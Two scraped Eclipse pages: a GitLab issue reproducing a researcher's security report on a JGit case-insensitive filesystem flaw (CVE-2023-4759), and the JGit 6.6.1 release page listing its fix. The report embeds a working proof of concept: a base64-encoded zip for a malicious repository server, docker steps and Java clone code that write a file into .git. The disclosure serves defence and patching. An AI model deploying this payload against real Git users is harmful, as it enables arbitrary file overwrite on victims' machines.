=== Content from gitlab.eclipse.org_902ab541_20250111_114645.html ===


[Skip to content](#content-body)
GitLab
[![](data:image/gif;base64...)](/ "Homepage")

* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)

# JGit: Improper handling of case insensitive filesystems in JGit allows arbitrary file write

Report from the security@ mailing list:

RyotaK ryotak.mail@gmail.com

8:50 AM (48 minutes ago)

to security
Hello Eclipse security team,
I'm a security researcher who discovered a vulnerability in JGit.

In `org.eclipse.jgit/src/org/eclipse/jgit/dircache/BaseDirCacheEditor.java`,
the following code is used to compare the name conflict.

org.eclipse.jgit/src/org/eclipse/jgit/dircache/BaseDirCacheEditor.java
line 183-185

```
int cmp = compareSameName(
        ePath, prefixLen, ePath.length,
        nPath, prefixLen, s, m);
```

Because this code doesn't validate whether the filesystem is case
sensitive, a malicious repository can cause unintended write to the
symbolic link using conflicted filenames.
For example, assuming the following two files are included in the
repository, hacked will be written to the .git directory instead of
the dir1 directory on the case-insensitive filesystem.

```
Dir1 (symbolic link to .git directory)
dir1/hacked
```

Steps to reproduce:
Since I read that the Eclipse security team can't download
attachments, I'm embedding all codes into this email.

1. Execute the following command:

```
echo "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"
| base64 -d > poc.zip && unzip poc.zip
```

2. Run `docker compose up -d`.
3. Execute the following Java code:

```
File localPath = new File("./TestRepo");
Git.cloneRepository()
  .setURI("http://localhost:18080/test.git")
  .setDirectory(localPath)
  .call();
```

4. Confirm that a file called `.git/hacked` is created.

Best regards,
RyotaK

And the followup message:

```
I forgot to note that I only tried it on macOS, and I haven't tested
it on Windows. Please use macOS while reproducing the issue.
```

Edited Jun 16, 2023 by [Marta Rybczynska](/mrybczyn)

To upload designs, you'll need to enable LFS and have an admin enable hashed storage. [More information](/help/user/project/issues/design_management.md#prerequisites)

Assignee
Loading

Time tracking
Loading

Copyright © Eclipse Foundation, Inc. All Rights Reserved.     [Privacy Policy](https://www.eclipse.org/legal/privacy.php) | [Terms of Use](https://www.eclipse.org/legal/termsofuse.php) | [Copyright Agent](https://www.eclipse.org/legal/copyright.php)



=== Content from projects.eclipse.org_9035e368_20250111_114646.html ===

[Skip to main content](#main-content)

* [Log in](/user/login?destination=/projects/technology.jgit/releases/6.6.1)
* Manage Cookies

[![Eclipse Foundation](/themes/custom/solstice/images/logos/eclipse-foundation-grey-orange.svg)](https://www.eclipse.org)

* Projects
* Supporters
* Collaborations
* Resources
* The Foundation

[Download](https://www.eclipse.org/downloads)

* Projects
  + Technologies
    - [Developer Tools & IDEs](https://www.eclipse.org/topics/ide/)
    - [Cloud Native](https://www.eclipse.org/topics/cloud-native/)
    - [Edge & IoT](https://www.eclipse.org/topics/edge-and-iot/)
    - [Automotive & Mobility](https://www.eclipse.org/topics/automotive-and-mobility/)
  + Projects
    - [Project Finder](https://projects.eclipse.org/)
    - [Project Activity](https://www.eclipse.org/projects/project_activity.php)
    - [Project Resources](https://www.eclipse.org/projects/resources/)
    - [Specifications](https://eclipse.org/specifications/)
    - [Contribute](https://www.eclipse.org/contribute/)
* Supporters
  + Membership
    - [Our Members](https://www.eclipse.org/membership/exploreMembership.php)
    - [Member Benefits](https://www.eclipse.org/membership/)
    - [Membership Levels & Fees](https://www.eclipse.org/membership/#tab-levels)
    - [Membership Application](https://www.eclipse.org/membership/#tab-membership)
    - [Member Resources](https://www.eclipse.org/membership/#tab-resources)
    - [Member Portal](https://membership.eclipse.org/portal)
  + Sponsorship
    - [Sponsor](https://newsroom.eclipse.org/)
    - [Corporate Sponsorship](https://www.eclipse.org/org/corporate_sponsors/)
    - [Sponsor a Collaboration](https://www.eclipse.org/sponsor/collaboration/)
* Collaborations
  + Industry Collaborations
    - [About Industry Collaborations](https://www.eclipse.org/collaborations/)
    - [Current Collaborations](https://www.eclipse.org/org/workinggroups/explore.php)
    - [About Working Groups](https://www.eclipse.org/org/workinggroups/about.php)
    - [About Interest Groups](https://www.eclipse.org/collaborations/interest-groups/)
  + Research Collaborations
    - [Research @ Eclipse](https://www.eclipse.org/research/)
* Resources
  + Open Source for Business
    - [Business Value of Open Source](https://www.eclipse.org/org/value/)
    - [Professional Services](https://www.eclipse.org/os4biz/services/)
    - [Open Source Program Offices](https://www.eclipse.org/os4biz/ospo/)
  + What's Happening
    - [News](https://newsroom.eclipse.org/)
    - [Events](https://events.eclipse.org/)
    - [Newsletter](https://www.eclipse.org/community/eclipse_newsletter/)
    - [Press Releases](https://newsroom.eclipse.org/news/press-releases)
    - [Awards & Recognition](https://www.eclipse.org/org/foundation/eclipseawards/)
  + Developer Resources
    - [Forum](https://www.eclipse.org/forums/)
    - [Mailing Lists](https://accounts.eclipse.org/mailing-list)
    - [Blogs & Videos](https://blogs.eclipse.org/)
    - [Marketplaces](https://www.eclipse.org/resources/marketplaces)
* The Foundation
  + About
    - [About the Eclipse Foundation](https://www.eclipse.org/org/)
    - [Board & Governance](https://www.eclipse.org/org/governance)
    - [Staff](https://www.eclipse.org/org/foundation/staff.php)
    - [Services](https://www.eclipse.org/org/services)
  + Legal
    - [Legal Policies](https://www.eclipse.org/legal/)
    - [Privacy Policy](https://www.eclipse.org/legal/privacy/)
    - [Terms of Use](https://www.eclipse.org/legal/terms-of-use/)
    - [Compliance](https://www.eclipse.org/legal/compliance/)
    - [Eclipse Public License](https://www.eclipse.org/legal/epl-2.0/)
  + More
    - [Press Releases](https://newsroom.eclipse.org/news/press-releases)
    - [Careers](https://www.eclipse.org/careers/)
    - [Logos & Artwork](https://www.eclipse.org/org/artwork/)
    - [Contact Us](https://www.eclipse.org/org/foundation/contact.php)

Projects

The Eclipse Foundation is home to the Eclipse IDE, Jakarta EE, and hundreds of open source projects, including runtimes, tools, specifications, and frameworks for cloud and edge applications, IoT, AI, automotive, systems engineering, open processor designs, and many others.

Technologies

* [Developer Tools & IDEs](https://www.eclipse.org/topics/ide/)
* [Cloud Native](https://www.eclipse.org/topics/cloud-native/)
* [Edge & IoT](https://www.eclipse.org/topics/edge-and-iot/)
* [Automotive & Mobility](https://www.eclipse.org/topics/automotive-and-mobility/)

Projects

* [Project Finder](https://projects.eclipse.org/)
* [Project Activity](https://www.eclipse.org/projects/project_activity.php)
* [Project Resources](https://www.eclipse.org/projects/resources/)
* [Specifications](https://eclipse.org/specifications/)
* [Contribute](https://www.eclipse.org/contribute/)

Supporters

The Eclipse Foundation is an international non-profit association supported by our members, including industry leaders who value open source as a key enabler for their business strategies.

Membership

* [Our Members](https://www.eclipse.org/membership/exploreMembership.php)
* [Member Benefits](https://www.eclipse.org/membership/)
* [Membership Levels & Fees](https://www.eclipse.org/membership/#tab-levels)
* [Membership Application](https://www.eclipse.org/membership/#tab-membership)
* [Member Resources](https://www.eclipse.org/membership/#tab-resources)
* [Member Portal](https://membership.eclipse.org/portal)

Sponsorship

* [Sponsor](https://www.eclipse.org/sponsor/)
* [Corporate Sponsorship](https://www.eclipse.org/org/corporate_sponsors/)
* [Sponsor a Collaboration](https://www.eclipse.org/sponsor/collaboration/)

Collaborations

Whether you intend on contributing to Eclipse technologies that are important to your product strategy, or simply want to explore a specific innovation area with like-minded organizations, the Eclipse Foundation is the open source home for industry collaboration.

Industry Collaborations

* [About Industry Collaborations](https://www.eclipse.org/collaborations/)
* [Current Collaborations](https://www.eclipse.org/org/workinggroups/explore.php)
* [About Working Groups](https://www.eclipse.org/org/workinggroups/about.php)
* [About Interest Groups](https://www.eclipse.org/collaborations/interest-groups/)

Research Collaborations

* [Research @ Eclipse](https://www.eclipse.org/research/)

Resources

The Eclipse community consists of individual developers and organizations spanning many industries. Stay up to date on our open source community and find resources to support your journey.

Open Source for Business

* [Business Value of Open Source](https://www.eclipse.org/org/value/)
* [Professional Services](https://www.eclipse.org/os4biz/services/)
* [Open Source Program Offices](https://www.eclipse.org/os4biz/ospo/)

What's Happening

* [News](https://newsroom.eclipse.org/)
* [Events](https://events.eclipse.org/)
* [Newsletter](https://www.eclipse.org/community/eclipse_newsletter)
* [Press Releases](https://newsroom.eclipse.org/news/press-releases)
* [Awards & Recognition](https://www.eclipse.org/org/foundation/eclipseawards/)

Developer Resources

* [Forum](https://www.eclipse.org/forums/)
* [Mailing Lists](https://accounts.eclipse.org/mailing-list)
* [Blogs & Videos](https://blogs.eclipse.org/)
* [Marketplaces](https://www.eclipse.org/resources/marketplaces)

The Foundation

The Eclipse Foundation provides our global community of individuals and organizations with a mature, scalable, and vendor-neutral environment for open source software collaboration and innovation.

About

* [About the Eclipse Foundation](https://www.eclipse.org/org/)
* [Board & Governance](https://www.eclipse.org/org/governance)
* [Staff](https://www.eclipse.org/org/foundation/staff.php)
* [Services](https://www.eclipse.org/org/services)

Legal

* [Legal Policies](https://www.eclipse.org/legal/)
* [Privacy Policy](https://www.eclipse.org/legal/privacy/)
* [Terms of Use](https://www.eclipse.org/legal/terms-of-use/)
* [Compliance](https://www.eclipse.org/legal/compliance/)
* [Eclipse Public License](https://www.eclipse.org/legal/epl-2.0/)

More

* [Press Releases](https://newsroom.eclipse.org/news/press-releases)
* [Careers](https://www.eclipse.org/careers/)
* [Logos & Artwork](https://www.eclipse.org/org/artwork/)
* [Contact Us](https://www.eclipse.org/org/foundation/contact.php)

1. [Home](https://www.eclipse.org)
2. [Projects](/)
3. [Eclipse Technology](/projects/technology)
4. [Eclipse JGit: Java implementation of Git](/projects/technology.jgit)
5. 6.6.1

# Eclipse JGit: Java implementation of Git 6.6.1

## Primary tabs

* [Overview](/projects/technology.jgit/releases/6.6.1)
* [Release Plan](/projects/technology.jgit/releases/6.6.1/plan)
* [Review Information](/projects/technology.jgit/releases/6.6.1/review)

## Security Fixes

* Fix [CVE-2023-4759 Arbitrary File Overwrite](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-4759)

## Bug Fixes

* [582039](https://eclip.se/582039) Express the explicit intention of creating bitmaps in GC to allow the GC.repack() phase to explicitly generate bitmaps only for the heads packfile and not for the others.
* [581532](https://eclip.se/581532) GC: prune all packfiles after the loosen phase. This prevents a series of exceptions previously thrown when loosening the packfiles.
* [582044](https://eclip.se/582044) Revert "RefDirectory: Throw exception if compare-and-swap of packed ref list fails"

## Build and Release Engineering

* Update tycho to 4.0.1
* Update bazel to 6.2.0
* Bazel: Fix remote build execution for Java 17

Release Date
Saturday, September 2, 2023 - 12:00

Release Type
Service release (bug fixes only)

## Project Links

* [Website](https://www.eclipse.org/jgit/)
* [Documentation](https://www.eclipse.org/jgit/documentation/)
* [Wiki](https://github.com/eclipse-jgit/jgit/wiki)
* [Dev Mailing List](https://accounts.eclipse.org/mailing-list/jgit-dev)
* [Forums](https://github.com/eclipse-jgit/jgit/issues)

[![Eclipse JGit: Java implementation of Git](/sites/default/files/styles/project_logo/public/jgit_0.png?itok=qP78h-VE)](/projects/technology.jgit)

## Related Projects

### Related Projects:

* **Eclipse Technology**
  + [Eclipse EGit: Git…](/projects/technology.egit)

### Project Hierarchy:

* [Eclipse Technology](/projects/technology)
  + [Eclipse JGit: Java…](/projects/technology.jgit)

## Project Tags

### Technology Types

* [OSGi](/technology-type/osgi)
* [Tools](/technology-type/tools)

### Build Technologies

* [Jenkins](/build-technology/jenkins)
* [Maven](/build-technology/maven)
* [Tycho](/build-technology/tycho)

[Back to the top](#top)

Eclipse Foundation

* [About](https://www.eclipse.org/org/)
* [Projects](https://projects.eclipse.org/)
* [Collaborations](https://www.eclipse.org/collaborations/)
* [Membership](https://www.eclipse.org/membership/)
* [Sponsor](https://www.eclipse.org/sponsor/)

Legal

* [Privacy Policy](https://www.eclipse.org/legal/privacy/)
* [Terms of Use](https://www.eclipse.org/legal/terms-of-use/)
* [Compliance](https://www.eclipse.org/legal/compliance/)
* [Code of Conduct](https://www.eclipse.org/org/documents/Community_Code_of_Conduct.php)
* [Legal Resources](https://www.eclipse.org/legal/)
* Manage Cookies

More

* [Report a Vulnerability](https://www.eclipse.org/security/)
* [Service Status](https://www.eclipsestatus.io/)
* [Contact](https://www.eclipse.org/org/foundation/contact.php)
* [Support](https://www.eclipse.org/projects/support/)

Follow Us:

Subscribe to our Newsletter

Copyright © Eclipse Foundation AISBL. All Rights Reserved.

Back to the top


